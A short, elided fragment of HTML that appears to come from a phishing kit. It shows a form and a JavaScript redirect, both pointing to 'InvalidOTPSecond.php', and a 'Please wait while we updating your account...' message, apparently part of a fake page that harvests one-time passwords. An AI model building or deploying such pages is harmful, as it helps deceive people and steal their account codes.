...
<meta name="theme-color" content="#ffffff">
    ...
    <form action="InvalidOTPSecond.php" method="post">
    <div id="ha">
    <center><h4 style="color:green; font-size:15px; font-family: Arial, Helvetica, sans-serif; margin:0px;">Please wait while we updating your account...</h4></center>
    </div>
    <div id="ba">
   ...
   <script>
   function myFunction() {
   window.location.href = "InvalidOTPSecond.php";
   }
   </script>
   <!--<div id="bb">
